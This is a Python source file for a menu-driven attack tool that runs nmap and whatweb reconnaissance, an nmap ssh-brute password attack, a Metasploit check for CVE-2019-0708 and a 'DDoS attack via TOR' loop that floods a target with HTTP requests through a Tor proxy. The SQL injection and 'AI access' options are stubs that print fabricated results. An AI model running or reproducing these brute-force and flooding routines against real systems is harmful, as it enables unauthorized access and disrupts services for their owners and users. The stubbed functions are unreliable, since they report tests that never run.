import subprocess
import requests
import time
import sys
import random
import socket
from rich.console import Console
from rich.table import Table
from rich.progress import track
from stem import Signal
from stem.control import Controller
from threading import Thread
from datetime import datetime

console = Console()

# Function to log actions and results into a log file
def add_log(message):
    timestamp = datetime.now().strftime("%d-%m-%Y-%H-%M")
    log_filename = f"logs-{timestamp}.txt"
    with open(log_filename, "a") as log_file:
        log_file.write(f"{timestamp} - {message}\n")

# Loading animation function
def loading(message):
    console.print(f"[bold cyan]{message}...[/bold cyan]")
    for _ in track(range(3), description="[bold yellow]Loading...[/bold yellow]"):
        time.sleep(1)
    console.print("\n")

# Secure input function
def safe_input(prompt):
    try:
        return input(prompt)
    except EOFError:
        console.print("[bold red]Error: Unable to read user input.[/bold red]")
        sys.exit(1)

# Function for IP lookup
def ip_lookup(ip):
    loading(f"IP Lookup for {ip}")
    try:
        url = f"https://ipinfo.io/{ip}/json"
        response = requests.get(url)
        data = response.json()

        if "error" in data:
            console.print(f"[bold red][-] Error IP Lookup: {data['error']['message']}")
        else:
            lookup_table = Table(title=f"IP Lookup for {ip}", show_lines=True)
            lookup_table.add_column("Field", style="cyan")
            lookup_table.add_column("Value", style="magenta")

            for key, value in data.items():
                lookup_table.add_row(key, value)

            console.print(lookup_table)
            add_log(f"IP Lookup for {ip}: {data}")
    except requests.RequestException as e:
        console.print(f"[bold red][-] Connection error for IP Lookup: {e}")
        add_log(f"IP Lookup Error for {ip}: {e}")

# Function to run WhatWeb scan
def whatweb_scan(ip):
    loading(f"Running WhatWeb scan on {ip}")
    try:
        result = subprocess.run(["whatweb", ip], capture_output=True, text=True)

        whatweb_table = Table(title=f"Information from WhatWeb", show_lines=True)
        whatweb_table.add_column("Data", style="cyan")
        whatweb_table.add_column("Value", style="magenta")

        os_info = "Unknown"
        technologies = "No technologies found"

        if "OS" in result.stdout:
            os_info = result.stdout.split("OS:")[-1].split("\n")[0].strip()
        if "Technologies" in result.stdout:
            technologies = result.stdout.split("Technologies:")[-1].split("\n")[0].strip()

        whatweb_table.add_row("Operating System", os_info)
        whatweb_table.add_row("Technologies", technologies)

        console.print(whatweb_table)
        add_log(f"WhatWeb scan for {ip}: {result.stdout}")
    except Exception as e:
        console.print(f"[bold red][-] Error during WhatWeb scan: {e}")
        add_log(f"WhatWeb scan error for {ip}: {e}")

# Function to detect target OS
def detect_os(ip):
    loading(f"Detecting OS for {ip}")
    try:
        result = subprocess.run(
            ["nmap", "-O", ip],
            capture_output=True,
            text=True
        )

        os_info = "Not detected"
        os_version = "Not available"

        if "OS details" in result.stdout:
            os_info = result.stdout.split("OS details:")[-1].split("\n")[0].strip()

        if "OS fingerprint" in result.stdout:
            os_version = result.stdout.split("OS fingerprint:")[-1].split("\n")[0].strip()

        if os_info == "Not detected":
            console.print(f"[bold red][-] OS detection failed.")
        else:
            os_table = Table(title=f"OS Information for {ip}", show_lines=True)
            os_table.add_column("Operating System", style="cyan")
            os_table.add_column("Version", style="magenta")
            os_table.add_row(os_info, os_version)

            console.print(os_table)
            add_log(f"OS Detection for {ip}: {os_info}, {os_version}")

    except Exception as e:
        console.print(f"[bold red][-] Error during OS detection: {e}")
        add_log(f"OS Detection Error for {ip}: {e}")

# Function to scan all ports of the target IP
def scan_ports(ip):
    loading(f"Scanning ports on {ip}")
    try:
        result = subprocess.run(
            ["nmap", "-p-", ip],
            capture_output=True,
            text=True
        )

        port_table = Table(title=f"Port Scan for {ip}", show_lines=True)
        port_table.add_column("Port", style="cyan")
        port_table.add_column("Status", style="magenta")

        for line in result.stdout.splitlines():
            if "/tcp" in line or "/udp" in line:
                parts = line.split()
                port = parts[0]
                status = parts[1]
                port_table.add_row(port, status)

        console.print(port_table)
        add_log(f"Port scan for {ip}: {result.stdout}")
    except Exception as e:
        console.print(f"[bold red][-] Error during port scan: {e}")
        add_log(f"Port Scan Error for {ip}: {e}")

# Function to perform brute force on SSH
def brute_force_ssh(ip):
    loading(f"Brute force SSH on {ip}")
    try:
        result = subprocess.run(
            ["nmap", "--script", "ssh-brute", ip],
            capture_output=True,
            text=True
        )
        console.print(f"[bold cyan]SSH Brute Force results :[/bold cyan]")
        console.print(result.stdout)
        add_log(f"SSH Brute Force for {ip}: {result.stdout}")
    except Exception as e:
        console.print(f"[bold red][-] Error during SSH brute force: {e}")
        add_log(f"SSH Brute Force Error for {ip}: {e}")

# Function to scan CVE using Metasploit
def scan_cve_with_metasploit(ip):
    loading(f"Scanning CVE for {ip} using Metasploit")

    try:
        # Start Metasploit framework's msfconsole via subprocess
        result = subprocess.run(
            ["msfconsole", "-q", "-x", f"use auxiliary/scanner/vuln/cve_2019_0708; set RHOSTS {ip}; run"],
            capture_output=True,
            text=True
        )

        if "No vulnerabilities" in result.stdout:
            console.print(f"[bold green][+] No vulnerabilities found for {ip}[/bold green]")
        else:
            metasploit_table = Table(title=f"CVE Scan Results for {ip}", show_lines=True)
            metasploit_table.add_column("Vulnerability", style="cyan")
            metasploit_table.add_column("Description", style="magenta")

            # Process the output and extract vulnerabilities (this can be customized based on the MSF output)
            vulnerabilities = result.stdout.splitlines()
            for vuln in vulnerabilities:
                if "CVE" in vuln:
                    # Example: Extract relevant lines that contain CVE-related information
                    vuln_parts = vuln.split(" - ")
                    if len(vuln_parts) > 1:
                        metasploit_table.add_row(vuln_parts[0], vuln_parts[1])

            console.print(metasploit_table)
            add_log(f"Metasploit CVE Scan for {ip}: {result.stdout}")
        
    except Exception as e:
        console.print(f"[bold red][-] Error during CVE scan with Metasploit: {e}")
        add_log(f"Metasploit CVE Scan Error for {ip}: {e}")

# Function to test SQL injections
def sql_injection_test(ip):
    loading(f"SQL injection test on {ip}")
    # Add SQL injection test code here
    console.print("[bold cyan]SQL Injection Test[/bold cyan]")
    console.print(f"[bold green][+] Test performed on {ip}")

# Function for AI access simulation
def ai_access(ip):
    loading(f"Using AI to access {ip}")
    console.print("[bold cyan]AI Access[/bold cyan]")
    console.print(f"[bold red][-] Unauthorized access")

# Function to save results
def save_results(results):
    filename = time.strftime("%d-%m-%Y-%H-%M.txt")
    with open(filename, "w") as file:
        file.write(results)
    console.print(f"[bold green][+][/bold green] Results saved to {filename}")
    add_log(f"Results saved: {filename}")

# Function to perform DDoS attack via TOR
def ddos_attack_via_tor(ip):
    loading(f"DDoS attack on {ip} via TOR")

    def start_tor():
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
        except Exception as e:
            console.print(f"[bold red][-] Error connecting to TOR network: {e}")
            add_log(f"TOR Connection Error: {e}")

    def attack(ip):
        try:
            # Connect via TOR proxy
            session = requests.Session()
            session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

            # Send requests for DDoS attack
            while True:
                session.get(f'http://{ip}')
                console.print(f"[bold yellow][+] Attack ongoing on {ip}[/bold yellow]")
                add_log(f"DDoS Attack ongoing on {ip}")

        except Exception as e:
            console.print(f"[bold red][-] Error during DDoS attack via TOR: {e}")
            add_log(f"DDoS Attack Error for {ip}: {e}")

    # Start TOR and attack
    tor_thread = Thread(target=start_tor)
    attack_thread = Thread(target=attack, args=(ip,))

    tor_thread.start()
    attack_thread.start()

    tor_thread.join()
    attack_thread.join()

# Main menu function
def main():
    while True:
        console.print("\n[bold blue]=== Menu ===[/bold blue]")
        console.print("1. Enter target IP or domain name")
        console.print("2. IP Lookup")
        console.print("3. WhatWeb")
        console.print("4. OS Detection")
        console.print("5. Port Scan")
        console.print("6. SSH Brute Force")
        console.print("7. CVE Scan (Metasploit)")
        console.print("8. SQL Injection Test")
        console.print("9. Use AI to access system")
        console.print("10. Save results")
        console.print("11. DDoS Attack via TOR")  # Changed position to 11
        console.print("12. Kitter (Exit)")  # Changed position to 12, now it exits

        choice = safe_input("Choose an option (1-12): ")

        if choice == "1":
            ip = safe_input("Enter target IP or domain name: ")
        elif choice == "2":
            ip_lookup(ip)
        elif choice == "3":
            whatweb_scan(ip)
        elif choice == "4":
            detect_os(ip)
        elif choice == "5":
            scan_ports(ip)
        elif choice == "6":
            brute_force_ssh(ip)
        elif choice == "7":
            scan_cve_with_metasploit(ip)
        elif choice == "8":
            sql_injection_test(ip)
        elif choice == "9":
            ai_access(ip)
        elif choice == "10":
            save_results("Analysis results")  # Replace with actual results
        elif choice == "11":
            ddos_attack_via_tor(ip)
        elif choice == "12":
            console.print("[bold green][+][/bold green] Exiting the program...")
            sys.exit()  # Exit the program
        else:
            console.print("[bold red][-] Invalid option.")

if __name__ == "__main__":
    main()

